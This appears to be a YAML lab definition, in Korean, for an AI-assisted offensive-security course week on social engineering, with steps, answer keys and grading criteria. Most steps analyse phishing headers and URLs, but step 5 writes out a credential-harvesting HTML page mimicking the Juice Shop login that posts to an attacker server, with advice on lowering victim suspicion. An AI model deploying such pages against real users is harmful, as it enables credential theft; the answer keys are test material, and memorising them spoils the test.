lab_id: attack-ai-week14
title: 소셜 엔지니어링 (Social Engineering) (AI 지원)
version: ai
course: attack-ai
week: 14
description: 기술적 취약점이 아닌 인간의 심리적 취약점을 공격하는 소셜 엔지니어링 기법을 학습한다. 피싱 이메일 분석, SET(Social Engineering Toolkit)
  활용, 프리텍스팅 등을 실습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- 소셜 엔지니어링의 주요 기법(피싱, 프리텍스팅, 베이팅)을 이해한다
- 피싱 이메일을 분석하고 탐지 지표를 식별할 수 있다
- 조직의 보안 인식 교육 프로그램을 설계할 수 있다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 소셜 엔지니어링의 6가지 영향력 원칙(치알디니)을 정리하고, 각 원칙이 피싱에 어떻게 활용되는지 설명하라.
  hint: 상호성, 일관성, 사회적 증거, 호감, 권위, 희소성의 6가지이다
  category: analysis
  points: 10
  answer: '🤖 프롬프트: 소셜 엔지니어링의 6가지 영향력 원칙(치알디니)을 정리하고, 각 원칙이 피싱에 어떻게 활용되는지 설명해줘

    📎 참고 (CLI): echo -e ''=== Cialdini 6 Principles of Influence ===\n\n1. Reciprocity (상호성)\n   Phishing:
    "We gave you a free gift, now verify your account"\n\n2. Commitment/Consistency (일관성)\n   Phishing:
    "You started the verification, please complete it"\n\n3. Social Proof (사회적 증거)\n   Phishing: "50,000
    users already updated their info"\n\n4. Liking (호감)\n   Phishing: Impersonate trusted colleague/friend\n\n5.
    Authority (권위)\n   Phishing: "IT Department requires immediate password reset"\n\n6. Scarcity (희소성)\n   Phishing:
    "Your account will be suspended in 24 hours"'''
  answer_detail: 치알디니의 6가지 영향력 원칙은 소셜 엔지니어링의 이론적 기반이다. 공격자는 이 원칙을 조합하여 피해자의 비합리적 행동(링크 클릭, 정보 제공)을 유도한다.
    보안 인식 교육에서 이 원칙을 가르치면 방어력이 향상된다.
  verify:
    type: output_contains
    expect: Cialdini
    field: stdout
    semantic:
      intent: 치알디니 6원칙(Reciprocity·Commitment/Consistency·Social Proof·Liking·Authority·Scarcity)을 소셜
        엔지니어링 피싱 맥락에 매핑 — 각 원칙별 대표 피싱 문구 예시 (상호성=무료 선물 후 확인 요구·일관성=부분 완료 유도·사회적 증거=5만명 이미 업데이트·호감=동료 사칭·권위=IT부서
        지시·희소성=24시간 후 정지)
      success_criteria:
      - Cialdini 또는 6 Principles 키워드 포함
      - 6개 원칙 모두 나열 (최소 5개) + 한국어 병기
      - 각 원칙에 대응하는 피싱 문구/시나리오 제시
      acceptable_methods:
      - echo -e 로 6 원칙 구조화 출력
      - 'Influence: The Psychology of Persuasion(치알디니) 인용'
      - SANS Security Awareness 프레임워크 참조
      - MITRE ATT&CK T1566(Phishing) 매핑
      negative_signs:
      - 원칙 5개 미만 커버
      - 피싱 맥락 매핑 없이 원칙만 나열
      - 한국어 번역 없어 학습 가치 낮음
  target_vm: attacker
  script: 'echo -e ''=== Cialdini 6 Principles of Influence ===\n\n1. Reciprocity (상호성)\n   Phishing:
    "We gave you a free gift, now verify your account"\n\n2. Commitment/Consistency (일관성)\n   Phishing:
    "You started the verification, please complete it"\n\n3. Social Proof (사회적 증거)\n   Phishing: "50,000
    users already updated their info"\n\n4. Liking (호감)\n   Phishing: Impersonate trusted colleague/friend\n\n5.
    Authority (권위)\n   Phishing: "IT Department requires immediate password reset"\n\n6. Scarcity (희소성)\n   Phishing:
    "Your account will be suspended in 24 hours"'''
  risk_level: low
  bastion_prompt: 소셜 엔지니어링의 6가지 영향력 원칙(치알디니)을 정리하고, 각 원칙이 피싱에 어떻게 활용되는지 설명해줘
- order: 2
  instruction: 피싱 이메일의 헤더를 분석하는 방법을 시연하라. 발신자 위조를 탐지하기 위한 SPF, DKIM, DMARC 확인 방법을 설명하라.
  hint: 이메일 헤더의 Received, Return-Path, Authentication-Results를 분석한다
  category: analysis
  points: 10
  answer: '🤖 프롬프트: 피싱 이메일의 헤더를 분석하는 방법을 시연해줘

    📎 참고 (CLI): echo -e ''=== Phishing Email Header Analysis ===\n\n[Key Headers to Check]\n1. From: vs
    Return-Path: (mismatch = suspicious)\n2. Received: chain (trace actual path)\n3. Authentication-Results:\n   -
    SPF: pass/fail (sender IP authorized?)\n   - DKIM: pass/fail (email signed by domain?)\n   - DMARC:
    pass/fail (policy alignment?)\n\n[Red Flags]\n- From shows "bank@secure.com" but Return-Path is "x@evil.com"\n-
    Received chain shows foreign IP\n- SPF: fail -> sender IP not authorized\n- No DKIM signature\n- Reply-To
    different from From\n\n[Verification Commands]\ndig TXT _dmarc.example.com  # Check DMARC policy\ndig
    TXT example.com         # Check SPF record\n\n[Example SPF Check]'' && dig TXT google.com +short 2>/dev/null
    | head -3'
  answer_detail: 이메일 헤더 분석은 피싱 탐지의 핵심 기술이다. SPF는 발신 IP를 검증하고, DKIM은 이메일 무결성을 보장하며, DMARC는 SPF/DKIM 검증
    실패 시의 정책을 정의한다. 세 가지 모두 통과해야 신뢰할 수 있다.
  verify:
    type: output_contains
    expect: Phishing Email Header
    field: stdout
    semantic:
      intent: '피싱 이메일 헤더 분석 — From vs Return-Path 불일치, Received chain 추적, Authentication-Results 의 SPF(발신
        IP 인가)·DKIM(도메인 서명)·DMARC(정렬 정책) 검증. Red flag: SPF fail, 외부 IP, DKIM 미서명, Reply-To 불일치. dig TXT
        _dmarc.example.com + dig TXT example.com 로 정책 조회'
      success_criteria:
      - SPF·DKIM·DMARC 3종 인증 프로토콜 모두 언급
      - From vs Return-Path 불일치 같은 Red Flag 최소 2개
      - dig TXT _dmarc / dig TXT <domain> 등 실제 검증 명령
      acceptable_methods:
      - dig TXT _dmarc.domain + dig TXT domain
      - nslookup -type=txt _dmarc.domain
      - openssl smtp-tls-check 또는 mail-tester.com 사용
      - Microsoft Message Header Analyzer 웹 도구
      negative_signs:
      - SPF/DKIM/DMARC 중 1개만 설명
      - 실제 명령(dig/nslookup) 없이 개념만
      - Red Flag 사례 없음
  target_vm: attacker
  script: 'echo -e ''=== Phishing Email Header Analysis ===\n\n[Key Headers to Check]\n1. From: vs Return-Path:
    (mismatch = suspicious)\n2. Received: chain (trace actual path)\n3. Authentication-Results:\n   -
    SPF: pass/fail (sender IP authorized?)\n   - DKIM: pass/fail (email signed by domain?)\n   - DMARC:
    pass/fail (policy alignment?)\n\n[Red Flags]\n- From shows "bank@secure.com" but Return-Path is "x@evil.com"\n-
    Received chain shows foreign IP\n- SPF: fail -> sender IP not authorized\n- No DKIM signature\n- Reply-To
    different from From\n\n[Verification Commands]\ndig TXT _dmarc.example.com  # Check DMARC policy\ndig
    TXT example.com         # Check SPF record\n\n[Example SPF Check]'' && dig TXT google.com +short 2>/dev/null
    | head -3'
  risk_level: low
  bastion_prompt: 피싱 이메일의 헤더를 분석하는 방법을 시연해줘
- order: 3
  instruction: 피싱 URL을 분석하는 기법을 시연하라. URL의 도메인, 경로, 파라미터에서 악성 지표를 식별하라.
  hint: URL의 각 구성 요소를 분해하여 분석한다
  category: analysis
  points: 10
  answer: '🤖 프롬프트: 피싱 URL을 분석하는 기법을 시연하라. URL의 도메인, 경로, 파라미터에서 악성 지표를 식별해줘

    📎 참고 (CLI): echo -e ''=== Phishing URL Analysis ===\n\n[Suspicious URL Patterns]\n1. Typosquatting:
    g00gle.com, googIe.com (I vs l)\n2. Subdomain abuse: google.com.evil-site.com\n3. URL shortener: bit.ly/xxxxx
    (hides real destination)\n4. IP address: http://192.168.1.1/login\n5. Long subdomain: secure-login-google-verify.evil.com\n6.
    Unicode/Punycode: xn--ggle-55da.com (looks like google.com)\n\n[Analysis Steps]\n1. Hover over link
    (don\''t click)\n2. Check actual domain (rightmost before TLD)\n3. Verify SSL certificate issuer\n4.
    Check URL reputation: VirusTotal, URLhaus\n5. Use sandbox: any.run, hybrid-analysis\n\n[Python URL
    Parser]'' && python3 -c "from urllib.parse import urlparse; u=urlparse(''https://secure-login.google.com.evil-site.com/verify?user=admin&token=abc'');
    print(f''Scheme: {u.scheme}''); print(f''Netloc: {u.netloc}''); print(f''Actual domain: evil-site.com'');
    print(f''Path: {u.path}''); print(f''Params: {u.query}'')"'
  answer_detail: URL 분석에서 가장 중요한 것은 실제 도메인을 식별하는 것이다. TLD 바로 앞의 도메인이 실제 소유자이다. google.com.evil-site.com에서
    실제 도메인은 evil-site.com이다.
  verify:
    type: output_contains
    expect: Phishing URL Analysis
    field: stdout
    semantic:
      intent: 피싱 URL 분석 — 6가지 의심 패턴(Typosquatting g00gle/googIe, Subdomain abuse google.com.evil-site.com,
        URL shortener bit.ly, IP 주소, 긴 subdomain, Punycode xn--). 분석 5단계(hover·실제 도메인=TLD 직전·SSL 발급자·URL
        평판 VirusTotal·샌드박스 any.run). python urlparse 로 netloc 분해 실증
      success_criteria:
      - 4가지 이상 의심 URL 패턴 (Typosquatting/Subdomain abuse/Shortener/Punycode 등)
      - 실제 도메인은 TLD 바로 앞이라는 핵심 원리 언급
      - python urlparse 또는 평판 조회 도구(VirusTotal/URLhaus) 사용
      acceptable_methods:
      - python3 -c urlparse netloc 분해
      - curl -I 로 redirect chain 추적
      - VirusTotal API 또는 URLhaus 질의
      - whois · dig 로 도메인 소유자/나이 확인
      negative_signs:
      - URL 패턴 2개 이하
      - 실제 도메인 식별 원리 누락
      - 분석 도구 언급 없이 개념만
  target_vm: attacker
  script: 'echo -e ''=== Phishing URL Analysis ===\n\n[Suspicious URL Patterns]\n1. Typosquatting: g00gle.com,
    googIe.com (I vs l)\n2. Subdomain abuse: google.com.evil-site.com\n3. URL shortener: bit.ly/xxxxx
    (hides real destination)\n4. IP address: http://192.168.1.1/login\n5. Long subdomain: secure-login-google-verify.evil.com\n6.
    Unicode/Punycode: xn--ggle-55da.com (looks like google.com)\n\n[Analysis Steps]\n1. Hover over link
    (don\''t click)\n2. Check actual domain (rightmost before TLD)\n3. Verify SSL certificate issuer\n4.
    Check URL reputation: VirusTotal, URLhaus\n5. Use sandbox: any.run, hybrid-analysis\n\n[Python URL
    Parser]'' && python3 -c "from urllib.parse import urlparse; u=urlparse(''https://secure-login.google.com.evil-site.com/verify?user=admin&token=abc'');
    print(f''Scheme: {u.scheme}''); print(f''Netloc: {u.netloc}''); print(f''Actual domain: evil-site.com'');
    print(f''Path: {u.path}''); print(f''Params: {u.query}'')"'
  risk_level: low
  bastion_prompt: 피싱 URL을 분석하는 기법을 시연하라. URL의 도메인, 경로, 파라미터에서 악성 지표를 식별해줘
- order: 4
  instruction: SET(Social Engineering Toolkit)의 주요 기능과 공격 벡터를 정리하라.
  hint: SET의 메뉴 구조와 주요 공격 모듈을 설명한다
  category: analysis
  points: 10
  answer: '🤖 프롬프트: SET(Social Engineering Toolkit)의 주요 기능과 공격 벡터를 정리해줘

    📎 참고 (CLI): echo -e ''=== Social Engineering Toolkit (SET) ===\n\n[Main Modules]\n1. Spear-Phishing
    Attack\n   - Email with malicious attachment\n   - PDF/Office macro payload\n\n2. Website Attack\n   -
    Java Applet Attack\n   - Credential Harvester (clone login page)\n   - Tabnabbing\n   - Web Jacking\n\n3.
    Infectious Media Generator\n   - Autorun payload on USB\n\n4. Mass Mailer\n   - Bulk phishing email
    sender\n\n5. SMS Spoofing\n\n[Most Common: Credential Harvester]\nsetoolkit -> 1 -> 2 -> 3 -> 2\n->
    Enter target URL (e.g., https://mail.google.com)\n-> SET clones the login page\n-> Victim enters credentials
    -> captured\n\n[Note: SET is pre-installed in Kali Linux]'''
  answer_detail: SET는 소셜 엔지니어링 공격을 자동화하는 프레임워크이다. Credential Harvester는 대상 웹사이트의 로그인 페이지를 복제하여 피해자의 자격
    증명을 수집한다. 모의 피싱 훈련에 자주 사용된다.
  verify:
    type: output_contains
    expect: Social Engineering Toolkit
    field: stdout
    semantic:
      intent: SET(Social Engineering Toolkit) 5개 공격 벡터 — Spear-Phishing(PDF/Office macro), Website Attack(Java
        Applet·Credential Harvester·Tabnabbing·Web Jacking), Infectious Media Generator(USB autorun),
        Mass Mailer, SMS Spoofing. Credential Harvester 메뉴 경로(1→2→3→2 URL 입력→페이지 복제)와 Kali 기본 설치
      success_criteria:
      - SET 5개 주요 모듈 중 최소 3개 설명
      - Credential Harvester 메뉴 경로 또는 작동 방식
      - Kali Linux 기본 포함 언급
      acceptable_methods:
      - echo 로 setoolkit 모듈 구조화
      - setoolkit 실행 메뉴 순서 (1→2→3→2)
      - setoolkit + config/set.config 커스터마이징
      - Gophish · King Phisher 대안 언급
      negative_signs:
      - SET 모듈 2개 이하
      - Credential Harvester 동작 원리 누락
      - 공격 흐름(URL 입력→복제→자격증명 수집) 설명 없음
  target_vm: attacker
  script: 'echo -e ''=== Social Engineering Toolkit (SET) ===\n\n[Main Modules]\n1. Spear-Phishing Attack\n   -
    Email with malicious attachment\n   - PDF/Office macro payload\n\n2. Website Attack\n   - Java Applet
    Attack\n   - Credential Harvester (clone login page)\n   - Tabnabbing\n   - Web Jacking\n\n3. Infectious
    Media Generator\n   - Autorun payload on USB\n\n4. Mass Mailer\n   - Bulk phishing email sender\n\n5.
    SMS Spoofing\n\n[Most Common: Credential Harvester]\nsetoolkit -> 1 -> 2 -> 3 -> 2\n-> Enter target
    URL (e.g., https://mail.google.com)\n-> SET clones the login page\n-> Victim enters credentials ->
    captured\n\n[Note: SET is pre-installed in Kali Linux]'''
  risk_level: low
  bastion_prompt: SET(Social Engineering Toolkit)의 주요 기능과 공격 벡터를 정리해줘
- order: 5
  instruction: 간단한 피싱 페이지(Credential Harvester)를 HTML로 작성하라. JuiceShop 로그인 페이지를 모방하라.
  hint: HTML 폼의 action을 공격자 서버로 지정한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 간단한 피싱 페이지(Credential Harvester)를 HTML로 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): cat > /tmp/phishing_page.html << ''HTMLEOF''

    <!DOCTYPE html>

    <html>

    <head><title>OWASP Juice Shop - Login</title>

    <style>body{font-family:Arial;max-width:400px;margin:50px auto;}

    input{width:100%;padding:10px;margin:5px 0;}

    button{background:#4CAF50;color:white;padding:10px;width:100%;border:none;cursor:pointer;}</style>

    </head>

    <body>

    <h2>Juice Shop Login</h2>

    <form action="http://10.20.30.201:8888/capture" method="POST">

    <input type="email" name="email" placeholder="Email" required>

    <input type="password" name="password" placeholder="Password" required>

    <button type="submit">Log in</button>

    </form>

    <!-- Credential Harvester: captures to attacker server -->

    </body>

    </html>

    HTMLEOF

    echo ''Phishing page created:'' && cat /tmp/phishing_page.html'
  answer_detail: Credential Harvester는 정상 로그인 페이지와 시각적으로 동일하지만, 폼 데이터를 공격자 서버로 전송한다. 피해자는 정상적으로 로그인한 것으로
    착각한다. 실제 사이트로 리다이렉트하면 의심을 더욱 줄일 수 있다.
  verify:
    type: output_contains
    expect: Phishing page created
    field: stdout
    semantic:
      intent: JuiceShop 로그인 페이지 모방 HTML Credential Harvester 작성 — /tmp/phishing_page.html 에 heredoc HTMLEOF
        로 form action=http://10.20.30.201:8888/capture method=POST 지정, email+password 입력 필드, CSS 로 시각적
        동질감 부여. 피해자는 정상 로그인으로 인식하지만 자격 증명은 공격자 서버로 전송
      success_criteria:
      - /tmp/phishing_page.html 또는 유사 경로에 HTML 파일 생성
      - form action 이 공격자 서버(10.20.30.201:8888 또는 유사) POST 지정
      - email + password input 필드 포함된 로그인 폼
      acceptable_methods:
      - cat > /tmp/phishing_page.html << HTMLEOF heredoc
      - python http.server 로 정적 서빙 + SET Credential Harvester
      - 기존 로그인 페이지 wget -k 미러링 후 form 수정
      - gophish Landing Page 에 HTML 업로드
      negative_signs:
      - HTML 파일 미생성 (개념만)
      - form action 이 원본 사이트 그대로 — 자격증명 수집 안됨
      - 로그인 필드(email/password) 누락
  target_vm: attacker
  script: 'cat > /tmp/phishing_page.html << ''HTMLEOF''

    <!DOCTYPE html>

    <html>

    <head><title>OWASP Juice Shop - Login</title>

    <style>body{font-family:Arial;max-width:400px;margin:50px auto;}

    input{width:100%;padding:10px;margin:5px 0;}

    button{background:#4CAF50;color:white;padding:10px;width:100%;border:none;cursor:pointer;}</style>

    </head>

    <body>

    <h2>Juice Shop Login</h2>

